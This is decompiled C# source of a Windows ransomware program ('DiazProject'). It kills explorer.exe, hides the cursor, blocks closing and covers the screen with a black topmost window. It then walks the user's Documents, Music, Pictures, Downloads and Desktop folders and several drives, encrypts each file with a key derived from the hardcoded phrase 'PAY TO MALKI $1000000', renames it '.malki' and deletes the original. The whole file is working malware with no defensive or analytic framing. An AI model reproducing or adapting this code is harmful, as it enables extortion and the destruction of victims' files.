using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using DiazProject.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;

namespace DiazProject;

[DesignerGenerated]
public class Form1 : Form
{
	public enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("pbstatus")]
	private ProgressBar _pbstatus;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private object filenamez;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private FileStream fsInput;

	private FileStream fsOutput;

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ProgressBar pbstatus
	{
		get
		{
			return _pbstatus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_pbstatus = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		Label1 = new Label();
		ProgressBar1 = new ProgressBar();
		pbstatus = new ProgressBar();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(487, 231);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		((Control)ListBox1).set_Visible(false);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(997, 418);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Label1");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(0, 0);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(100, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(2);
		((Control)ProgressBar1).set_Visible(false);
		ProgressBar obj = pbstatus;
		location = new Point(21, 51);
		((Control)obj).set_Location(location);
		((Control)pbstatus).set_Name("pbstatus");
		ProgressBar obj2 = pbstatus;
		size = new Size(100, 23);
		((Control)obj2).set_Size(size);
		((Control)pbstatus).set_TabIndex(3);
		((Control)pbstatus).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		size = new Size(1350, 729);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)pbstatus);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("black");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_00be, IL_013a, IL_01fb, IL_027b, IL_033c, IL_03bc, IL_047d, IL_04fd, IL_05be, IL_063e, IL_06f0, IL_0761, IL_0813, IL_0884, IL_0936, IL_09a7, IL_0a59, IL_0aca, IL_0b7c, IL_0bed
		Interaction.Shell("taskkill /f /im explorer.exe", (AppWinStyle)2, false, -1);
		Cursor.Hide();
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments(), (SearchOption)2, new string[0]))
			{
				foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
				{
					if (!file.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file);
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments()))
			{
				if (!file2.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file2);
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic(), (SearchOption)2, new string[0]))
			{
				foreach (string file3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory2))
				{
					if (!file3.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file3);
					}
				}
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic()))
			{
				if (!file4.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file4);
				}
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures(), (SearchOption)2, new string[0]))
			{
				foreach (string file5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory3))
				{
					if (!file5.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file5);
					}
				}
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures()))
			{
				if (!file6.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file6);
				}
			}
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Downloads", (SearchOption)2, new string[0]))
			{
				foreach (string file7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory4))
				{
					if (!file7.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file7);
					}
				}
			}
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads"))
			{
				if (!file8.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file8);
				}
			}
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Desktop", (SearchOption)2, new string[0]))
			{
				foreach (string file9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory5))
				{
					if (!file9.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file9);
					}
				}
			}
		}
		catch (Exception ex17)
		{
			ProjectData.SetProjectError(ex17);
			Exception ex18 = ex17;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop"))
			{
				if (!file10.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file10);
				}
			}
		}
		catch (Exception ex19)
		{
			ProjectData.SetProjectError(ex19);
			Exception ex20 = ex19;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory6))
				{
					if (!file11.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file11);
					}
				}
			}
		}
		catch (Exception ex21)
		{
			ProjectData.SetProjectError(ex21);
			Exception ex22 = ex21;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("D:\\"))
			{
				if (!file12.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file12);
				}
			}
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23);
			Exception ex24 = ex23;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory7))
				{
					if (!file13.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file13);
					}
				}
			}
		}
		catch (Exception ex25)
		{
			ProjectData.SetProjectError(ex25);
			Exception ex26 = ex25;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("E:\\"))
			{
				if (!file14.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file14);
				}
			}
		}
		catch (Exception ex27)
		{
			ProjectData.SetProjectError(ex27);
			Exception ex28 = ex27;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("A:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory8))
				{
					if (!file15.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file15);
					}
				}
			}
		}
		catch (Exception ex29)
		{
			ProjectData.SetProjectError(ex29);
			Exception ex30 = ex29;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("A:\\"))
			{
				if (!file16.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file16);
				}
			}
		}
		catch (Exception ex31)
		{
			ProjectData.SetProjectError(ex31);
			Exception ex32 = ex31;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Z:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory9))
				{
					if (!file17.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file17);
					}
				}
			}
		}
		catch (Exception ex33)
		{
			ProjectData.SetProjectError(ex33);
			Exception ex34 = ex33;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("Z:\\"))
			{
				if (!file18.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file18);
				}
			}
		}
		catch (Exception ex35)
		{
			ProjectData.SetProjectError(ex35);
			Exception ex36 = ex35;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("X:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory10))
				{
					if (!file19.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file19);
					}
				}
			}
		}
		catch (Exception ex37)
		{
			ProjectData.SetProjectError(ex37);
			Exception ex38 = ex37;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file20 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("X:\\"))
			{
				if (!file20.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file20);
				}
			}
		}
		catch (Exception ex39)
		{
			ProjectData.SetProjectError(ex39);
			Exception ex40 = ex39;
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	public byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
				fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
				fsOutput.SetLength(0L);
				byte[] buffer = new byte[4097];
				long num = 0L;
				long length = fsInput.Length;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				pbstatus.set_Value(0);
				pbstatus.set_Maximum(100);
				CryptoStream cryptoStream = default(CryptoStream);
				switch (Direction)
				{
				case CryptoAction.ActionEncrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				case CryptoAction.ActionDecrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				}
				while (num < length)
				{
					int num2 = fsInput.Read(buffer, 0, 4096);
					cryptoStream.Write(buffer, 0, num2);
					num += num2;
					pbstatus.set_Value((int)Math.Round((double)num / (double)length * 100.0));
				}
				cryptoStream.Close();
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionEncrypt)
				{
					FileInfo fileInfo = new FileInfo(strFileToEncrypt);
					fileInfo.Delete();
				}
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo2 = new FileInfo(strFileToDecrypt);
					fileInfo2.Delete();
				}
				string text = "\r\n";
				if (Direction == CryptoAction.ActionEncrypt)
				{
					Interaction.MsgBox((object)("Encryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
				else
				{
					Interaction.MsgBox((object)("Decryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
			}
			catch (Exception projectError) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(projectError);
				return Information.Err().get_Number() == 53;
			}).Invoke())
			{
				Interaction.MsgBox((object)"Please check to make sure the path and filenameare correct and if the file exists.", (MsgBoxStyle)48, (object)"Invalid Path or Filename");
				ProjectData.ClearProjectError();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo3 = new FileInfo(Conversions.ToString(filenamez));
					fileInfo3.Delete();
				}
				else
				{
					FileInfo fileInfo4 = new FileInfo(Conversions.ToString(filenamez));
					fileInfo4.Delete();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			((Control)this).Hide();
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_WindowState((FormWindowState)1);
			Timer1.Stop();
			((Control)MyProject.Forms.Form2).Show();
			((Form)this).Close();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			byte[] bytKey = CreateKey("PAY TO MALKI $1000000");
			byte[] bytIV = CreateIV("PAY TO MALKI $1000000");
			EncryptOrDecryptFile(Conversions.ToString(filenamez), Conversions.ToString(Operators.AddObject(filenamez, (object)".malki")), bytKey, bytIV, CryptoAction.ActionEncrypt);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
	}
}
